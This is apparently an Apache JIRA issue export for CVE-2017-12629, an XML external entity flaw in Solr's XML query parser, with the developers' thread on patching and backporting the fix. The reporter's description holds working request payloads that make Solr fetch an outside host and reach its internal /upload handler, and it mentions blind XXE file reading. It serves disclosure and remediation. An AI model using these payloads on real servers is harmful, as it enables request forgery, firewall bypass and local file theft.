{
    "id": "SOLR-11477",
    "title": "CVE-2017-12629: Disable external entities in XML query parser",
    "details": {
        "labels": "",
        "priority": "Blocker",
        "components": [
            "query parsers",
            "security"
        ],
        "type": "Task",
        "fix_versions": [
            "5.5.5",
            "6.6.2",
            "7.1",
            "7.2",
            "master (8.0)"
        ],
        "affect_versions": "None",
        "resolution": "Fixed",
        "status": "Closed"
    },
    "description": "Lucene includes a query parser that is able to create the full-spectrum of Lucene queries, using an XML data structure. Starting from version 5.1 Solr supports \"xml\" query parser in the search query.\n\nThe problem is that lucene xml parser does not explicitly prohibit doctype declaration and expansion of external entities. It is possible to include special entities in the xml document, that point to external files (via file://) or external urls (via http://):\n\nExample usage: \n\nhttp://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://xxx.s.artsploit.com/xxx\"><a></a>'}\n\n\n\nWhen Solr is parsing this request, it makes a HTTP request to http://xxx.s.artsploit.com/xxx and treats its content as DOCTYPE definition. \n\nConsidering that we can define parser type in the search query, which is very often comes from untrusted user input, e.g. search fields on websites. It allows to an external attacker to make arbitrary HTTP requests to the local SOLR instance and to bypass all firewall restrictions.\n\nFor example, this vulnerability could be user to send malicious data to the '/upload' handler:\n\n\nhttp://localhost:8983/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://xxx.s.artsploit.com/solr/gettingstarted/upload?stream.body={\"xx\":\"yy\"}&commit=true\"'><a></a>'}\n\n\n\nThis vulnerability can also be exploited as Blind XXE using ftp wrapper in order to read arbitrary local files from the solrserver.",
    "attachments": {
        "SOLR-11477.patch": "https://issues.apache.org/jira/secure/attachment/12891798/SOLR-11477.patch"
    },
    "issue_links": {},
    "comments": [
        {
            "date": "2017-10-12T19:32:51+0000",
            "content": "I can take care of the XXE problems. We have code on Solr to secure XML parsers. Maybe use that when parser is called from Solr. ",
            "author": "Uwe Schindler",
            "id": "comment-16202493"
        },
        {
            "date": "2017-10-12T19:34:26+0000",
            "content": "The problem is that the code posted by the reporter is not compatible to all parsers, so you need Exception handling. Also use predefined constants instead of plain urls. ",
            "author": "Uwe Schindler",
            "id": "comment-16202497"
        },
        {
            "date": "2017-10-12T20:15:42+0000",
            "content": "Instead of just setting those properties (which is dependent on the XML parser), the solution in Solr is to configure the XML parser using the following class:\norg.apache.solr.common.EmptyEntityResolver\n\nI'd not change the XML parser in Lucene, as this may break applications. Instead we should do this only in Solr. I am working on a patch that wraps the parser with the given entity resolver and passes the DOM tree directly to the XML parser in Lucene. This way, the parsing is clearly separated between Solr and Lucene. IMHO, we should rmeove the convenience parser in Lucene.\n\nIn my earlier life I was the XML specialist... that's still the case. Unfortunately I did not see this leak. I was fixing all Solr external entity issues previously.\n\nDo you agree, Christine Poerschke? ",
            "author": "Uwe Schindler",
            "id": "comment-16202554"
        },
        {
            "date": "2017-10-12T20:17:19+0000",
            "content": "Attaching patch with the lucene/queryparser/src/java/org/apache/lucene/queryparser/xml/CoreParser.java remedies suggested by Michael and Olga.\n\n\n\tI've placed the setFeature calls in a protected setFeatures method and also added two tests in the lucene/queryparser/src/test/org/apache/lucene/queryparser/xml/TestCoreParser.java class. (Is a separate method perhaps too complicated or clearer and more extensible?)\n\n\n\n\n\tlucene/queryparser tests and solr/core \"ant test -Dtestcase=TestXmlQParser\" and \"ant test -Dtestcase=TestSolrCoreParser\" tests pass. \"ant precommit\" passes.\n\n\n\n\n\tDraft lucene/CHANGES.txt and solr/CHANGES.txt included, mentioning the setFeature method but not the CVE as per http://www.apache.org/security/committers.html points.\n\n\n\n(I will go offline now until some time tomorrow (Friday, London time) and if anyone in the meantime wanted to go ahead and review and/or revise and/or commit the patch, please feel free to do so.) ",
            "author": "Christine Poerschke",
            "id": "comment-16202556"
        },
        {
            "date": "2017-10-12T20:28:09+0000",
            "content": "Hi Uwe,\n\nOnly saw your comments above after posting my update.\n\nIn my earlier life I was the XML specialist... ...\n\nAm definitely not XML specialist and certainly learnt a lot by analyzing the issue report.\n\nI'd not change the XML parser in Lucene ...\n\nHow about changing Lucene too but in an opt-in or opt-out way e.g. variant constructors with a boolean flag to opt-in to the new behaviour (Solr to opt-in) or to opt-out of the new behavior?\n\n(Anyhow, going offline now. Catchup tomorrow. Thanks!) ",
            "author": "Christine Poerschke",
            "id": "comment-16202579"
        },
        {
            "date": "2017-10-12T21:35:13+0000",
            "content": "Here is my patch. I reused your sample files for testing:\n\n\tIt uses the same approach like used everywhere in Solr: Instead of trying to set non-standardized features of the parser, it registers an EntityResolver to the underlying SAX parser. This entity resolver just returns an empty stream for any external entity or DTD.\n\tThe tests now pass by default, as the XML files are still parsed. If the entities would be resolved (just comment out the setEntityResolver()) call, the tests would fail, as the XML parser would complain about the URL format: foo://bar.xyz is not a valid URL.\n\tIn Solr replaced the XML loading to improve error handling: It also registers the XML logger like used everywhere when parsing XML in Solr. This is functionally the same like CoreParser, but it additionally allows for the parser to report warnings, which it otherwise would print to stdout!!!\n\n\n\nThis approach is more safe, because it does not break parsing and works with every XML parser out there. It just ignores external entities. ",
            "author": "Uwe Schindler",
            "id": "comment-16202664"
        },
        {
            "date": "2017-10-13T08:08:19+0000",
            "content": "Thanks Uwe!\n\nI'm attaching my (work-in-progress on the train) snippet with EntityResolver use: how about not silently ignoring any entities but (in Solr only) out-right rejecting them? And might it be clearer for SolrCoreParser to not override the parse method if possible at all, keeping with the idea that SolrCoreParser mostly configures exactly what the lucene CoreParser does? The test cases in my snippet are incomplete still, will continue on that next. ",
            "author": "Christine Poerschke",
            "id": "comment-16203181"
        },
        {
            "date": "2017-10-13T08:21:49+0000",
            "content": "The problem with disallowing entities completely is that some XML documents contain a DOCTYPE header pointing to an external file. So in Solr's update handler we just ignore those (using EmptyEntityResolver). For the Solr Update Handler I'd stay with simply ignoring external entities (without error), but for the XML parser we could disallow them explicitely (like you proposed). Apache POI (which had the XXE problem 3 years ago) is doing the same for docx files (ignoring them).\n\nThe reason why I changed the XML parsing in Solr was for other reasons (it's not needed to fix the issue): I wanted to make the XML parsing also use Solr's logging features. Otherwise XML parsers tend to send stuff to system.out when something goes wrong. By registering an ErrorHandler, you can prevent that. In solr we have one that logs to log4j. This is done at all places in Solr that parses XML, the query parser was missing (as it was not yet there when I added that).\n\nBut we can do the same like with the entity resolver with a protected method. I was thinking about the same yesterday, but I wanted to have a quick hack. ",
            "author": "Uwe Schindler",
            "id": "comment-16203190"
        },
        {
            "date": "2017-10-13T08:52:43+0000",
            "content": "I changed the code locally. IMHO, I'd disallow external entities by defaulkt also in the Lucene parser, but document that. It's for safety. Somebody who wants to resolve them, would need to subclass and override the protected getter to return null.\n\nI will post my patch in a moment, have to update the tests. ",
            "author": "Uwe Schindler",
            "id": "comment-16203206"
        },
        {
            "date": "2017-10-13T09:02:13+0000",
            "content": "Here's my first (work-in-progress) stab at a combined patch, tests still failing though.\n\n(tinkered a little with the lucene side: adds CoreParser.getEntityResolver method, removes setValidating(false) since that is the default, comments why the setFeature exception is ignored) ",
            "author": "Christine Poerschke",
            "id": "comment-16203265"
        },
        {
            "date": "2017-10-13T09:05:58+0000",
            "content": "How about we give CoreParser.java a protected newDocumentBuilder(DocumentBuilderFactory dbf) method?\n\nThen SolrCoreParser.java could override that as\n\ndb = super.newDocumentBuilder(dbf);\ndb.setErrorHandler(xmllog);\nreturn db;\n\n\nor we could give CoreParser a protected getErrorHandler method? The latter would be better i guess? ",
            "author": "Christine Poerschke",
            "id": "comment-16203268"
        },
        {
            "date": "2017-10-13T09:08:29+0000",
            "content": "Here is my patch. The Solr parser is now untouched and I only added the error handler to sanitize logging.\n\nIs this better? ",
            "author": "Uwe Schindler",
            "id": "comment-16203269"
        },
        {
            "date": "2017-10-13T09:10:47+0000",
            "content": "Somehow we are doing similar things at same time. We should maybe merge the changes  ",
            "author": "Uwe Schindler",
            "id": "comment-16203272"
        },
        {
            "date": "2017-10-13T09:14:24+0000",
            "content": "I checked the Exception in better way now, so it ensures that we get the correct exception with right message text. ",
            "author": "Uwe Schindler",
            "id": "comment-16203278"
        },
        {
            "date": "2017-10-13T09:17:05+0000",
            "content": "Here's my latest, not yet having looked at yours. Yes we should merge \n\nTestSolrCoreParser.test_ENTITY_Goodbye still fails, don't know yet why - any ideas? ",
            "author": "Christine Poerschke",
            "id": "comment-16203281"
        },
        {
            "date": "2017-10-13T09:20:42+0000",
            "content": "In my patch the same test works. As said before, I disallowed external entity resolving in Lucene by default, too. So it may break some users, but its documented.\n\nI think my patch is shorter, as it does not deal with Solr at all (only the small error handler stuff). ",
            "author": "Uwe Schindler",
            "id": "comment-16203284"
        },
        {
            "date": "2017-10-13T09:25:33+0000",
            "content": "I like your shorter patch if also disallowing for Lucene by default is okay (which I think it is if it's documented).\n\nCan I merge into your patch my removal of the dbf.setValidating(false); (it's the default?) and the comment for the //ignore plus a little more in CHANGES.txt i.e. upgrading-from mention of the change and that getEntityResolver can be overridden? ",
            "author": "Christine Poerschke",
            "id": "comment-16203287"
        },
        {
            "date": "2017-10-13T10:16:39+0000",
            "content": "OK, will do! The tests are OK? ",
            "author": "Uwe Schindler",
            "id": "comment-16203345"
        },
        {
            "date": "2017-10-13T10:21:29+0000",
            "content": "Great, thanks! Here it is. Yes, I think the tests are okay and we're good to go here? ",
            "author": "Christine Poerschke",
            "id": "comment-16203350"
        },
        {
            "date": "2017-10-13T10:56:26+0000",
            "content": "I added the setValidating to be sure (it was recommended by some security pages and is also done by solr's code). I think better safe here. I will add more docuemntation to LUCENE's Changes.txt (some breaking changes section). In Solr we don't need to, as no user would subclass SolrCoreParser \n\nIn general in a separate issue we should improve the whole XML query parser to not create a DocumentBuilderFactory on every call and instead share one (unfortunately as ThreadLocal or synchronized). The lookup of the factory is unfortunately an expensive SPI lookup. But thats something for another issue. In Solr we generally share those\n\nIn addition, we should add more parse() method variants also taking InputSource and other types. The current variant solely taking an input stream is bad for error reporting, as an input stream does not have a System ID, so it cannot say whats exactly wrong with the XML. But the missing system ID for the document does not matter anyways, as we dont allow external refs. ",
            "author": "Uwe Schindler",
            "id": "comment-16203378"
        },
        {
            "date": "2017-10-13T10:59:09+0000",
            "content": "OK, I have seen you patch. Looks OK. I just added the setValidating() to false for security reasons (to be safe it's not doing this). I have no strong prefernce to keep it in or not.\n\nDo you want to commit? ",
            "author": "Uwe Schindler",
            "id": "comment-16203382"
        },
        {
            "date": "2017-10-13T11:13:06+0000",
            "content": "... it was recommended by some security pages ...\n\nAh, okay, makes sense then.\n\n... add more docuemntation to LUCENE's Changes.txt (some breaking changes section) ...\n\nCoreParser has two sub-classes in Lucene, maybe we should mention those too?\n\n... no user would subclass SolrCoreParser ...\n\nNot so sure about that, we have a subclass/clone of SolrCoreParser locally (on an older version of Solr though) which alters the init method's behaviour.\n\n... I just added the setValidating() to false ... Do you want to commit?\n\nI'm happy for you to proceed with the commit step. Thanks! ",
            "author": "Christine Poerschke",
            "id": "comment-16203388"
        },
        {
            "date": "2017-10-13T11:34:23+0000",
            "content": "Not so sure about that, we have a subclass/clone of SolrCoreParser locally (on an older version of Solr though) which alters the init method's behaviour.\n\nOn backporting, make sure to also add the logging stuff to the clone (if it's a clone).\n\nGo ahead with committing! ",
            "author": "Uwe Schindler",
            "id": "comment-16203411"
        },
        {
            "date": "2017-10-13T11:49:08+0000",
            "content": "Attaching final patch. master commit push to follow, then backporting to branch_7x and branch_7_1 branches. ",
            "author": "Christine Poerschke",
            "id": "comment-16203426"
        },
        {
            "date": "2017-10-13T12:01:11+0000",
            "content": "+1 ",
            "author": "Uwe Schindler",
            "id": "comment-16203444"
        },
        {
            "date": "2017-10-13T12:14:28+0000",
            "content": "Commits pushed to master and branch_7x and branch_7_1 (though the bot did not update this ticket looks like). ",
            "author": "Christine Poerschke",
            "id": "comment-16203464"
        },
        {
            "date": "2017-10-13T12:51:31+0000",
            "content": "+1, thanks Christine Poerschke and Uwe Schindler ",
            "author": "Tommaso Teofili",
            "id": "comment-16203517"
        },
        {
            "date": "2017-10-13T13:19:16+0000",
            "content": "commit links (since the bot did not auto-add them to this ticket):\n\n\tmaster: https://git1-us-west.apache.org/repos/asf?p=lucene-solr.git;a=commit;h=926cc4d6\n\tbranch_7x: https://git1-us-west.apache.org/repos/asf?p=lucene-solr.git;a=commit;h=d28baa3f\n\tbranch_7_1: https://git1-us-west.apache.org/repos/asf?p=lucene-solr.git;a=commit;h=3bba9113\n\tbranch_6_6: https://git1-us-west.apache.org/repos/asf?p=lucene-solr.git;a=commit;h=f9fd6e9e\n\n ",
            "author": "Christine Poerschke",
            "id": "comment-16203554"
        },
        {
            "date": "2017-10-13T13:21:31+0000",
            "content": "Shall I backport to branch_6_6 too? It cherry-picks cleanly except for CHANGES.txt conflicts which is to be expected. ",
            "author": "Christine Poerschke",
            "id": "comment-16203558"
        },
        {
            "date": "2017-10-13T13:51:56+0000",
            "content": "Maybe in 6.6 we should return \"null\" for getEntityResolver() and move the custom entity resolver to solr only? ",
            "author": "Uwe Schindler",
            "id": "comment-16203588"
        },
        {
            "date": "2017-10-13T15:17:40+0000",
            "content": "Maybe in 6.6 ...\n\nHmm, not sure about that. Wouldn't it be confusing for users to encounter one change in a 6.6.1 to 6.6.2 upgrade and then another similar but separate change in the upgrade to 7.1 version? I'd prefer a 6.6.2 be equivalent to 7.1 in terms of xml query parsing behaviour. ",
            "author": "Christine Poerschke",
            "id": "comment-16203690"
        },
        {
            "date": "2017-10-13T15:44:19+0000",
            "content": "I'd prefer a 6.6.2 be equivalent to 7.1 in terms of xml query parsing behaviour.\n\n+1 ",
            "author": "Tommaso Teofili",
            "id": "comment-16203721"
        },
        {
            "date": "2017-10-13T15:54:20+0000",
            "content": "I was just afraid to have a \"breaking\" section in a bugfix release. ",
            "author": "Uwe Schindler",
            "id": "comment-16203736"
        },
        {
            "date": "2017-10-13T16:12:53+0000",
            "content": "https://git1-us-west.apache.org/repos/asf?p=lucene-solr.git;a=commit;h=f9fd6e9e is the just-pushed branch_6_6 commit. (Everyone feel free to edit/merge the sections as part of the 6.6.2 release process if two sections with one/same ticket each are confusing or so.) ",
            "author": "Christine Poerschke",
            "id": "comment-16203773"
        },
        {
            "date": "2017-10-17T11:04:18+0000",
            "content": "Bulk close after 7.1.0 release ",
            "author": "Shalin Shekhar Mangar",
            "id": "comment-16207452"
        },
        {
            "date": "2017-10-17T19:46:36+0000",
            "content": "Reopening to backport to branch_5_5 ",
            "author": "Steve Rowe",
            "id": "comment-16208222"
        },
        {
            "date": "2017-10-17T20:57:16+0000",
            "content": "commit link for branch_5_5 (since the bot did not auto-add it to this ticket):\n\nhttp://git-wip-us.apache.org/repos/asf/lucene-solr/commit/d8000bee ",
            "author": "Steve Rowe",
            "id": "comment-16208322"
        },
        {
            "date": "2017-10-18T08:11:59+0000",
            "content": "Thanks Steve Rowe! ",
            "author": "Uwe Schindler",
            "id": "comment-16208957"
        },
        {
            "date": "2017-10-24T16:54:09+0000",
            "content": "Bulk close for 5.5.5 release. ",
            "author": "Steve Rowe",
            "id": "comment-16217244"
        }
    ]
}